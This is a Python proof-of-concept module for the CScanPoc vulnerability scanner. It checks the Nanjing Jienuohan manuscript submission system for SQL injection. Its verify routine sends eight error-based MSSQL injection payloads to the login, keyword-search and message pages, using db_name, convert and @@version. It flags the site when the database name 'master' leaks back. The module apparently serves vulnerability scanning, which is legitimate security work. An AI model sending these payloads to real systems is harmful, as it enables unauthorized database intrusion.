# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Jienuohan_0001'  # 平台漏洞编号，留空
    name = '南京杰诺瀚投稿系统 通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-29'  # 漏洞公布时间
    desc = '''
        诺瀚投稿系统的设计者是具有博士学位的资深编辑，熟悉国内外投稿和审稿系统。 在逐一比较分析国内外采编系统的优缺点基础上，广泛汲取国内外各 系统的优 点，博采众家精华，提出设计思想和功能需求，由南京杰诺瀚科技的软件工程 师具体完成。
        南京杰诺瀚投稿系统通，
        /Web/Login.aspx'
        /web/KeySearch.aspx?searchid=1'
        /KeySearch.aspx'
        /KeySearch.aspx'
        /KeySearch.aspx'
        /liuyan.aspx'
        /liuyan.aspx'
        /liuyan.aspx'
        存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=070091/077673/082926'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '杰诺瀚投稿系统'  # 漏洞应用名称
    product_version = '南京杰诺瀚投稿系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4f815e06-1966-4f44-8d92-0cf972eac27a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-070091
            # refer:http://www.wooyun.org/bugs/wooyun-2010-077673
            # refer:http://www.wooyun.org/bugs/wooyun-2010-082926
            payloads = [
                '/Web/Login.aspx',
                '/web/KeySearch.aspx?searchid=1',
                '/KeySearch.aspx',
                '/KeySearch.aspx',
                '/KeySearch.aspx',
                '/liuyan.aspx',
                '/liuyan.aspx',
                '/liuyan.aspx',
            ]
            postdatas = [
                'username=1%27%20and%20db_name%281%29%3E1--',
                'operat=Search&state=&keyword=1%25%27%20and%20db_name%281%29%3E1--',
                'title=1%27%20AND%20db_name%281%29%3E1--',
                'author=1%27%20AND%20db_name%281%29%3E1--',
                'keyword=1%27%20AND%20db_name%281%29%3E1--',
                'LinkTel=1%27%2b%20convert%28int%2C%28db_name%281%29%29%29%20%2b%27',
                'Mail=1%27%2b%20convert%28int%2C%28db_name%281%29%29%29%20%2b%27',
                'username=1%27%2b%20%28select%20convert%28int%2C%28@@version%29%29%20FROM%20syscolumns%29%20%2b%27'
            ]

            for i in range(8):
                verify_url = self.target + payloads[i]
                #code, head, res, errcode, _ = curl.curl2(url,postdatas[i])
                r = requests.get(verify_url, postdatas[i])
                if 'master' in r.text:
                    # security_hole(arg+payloads[i])
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
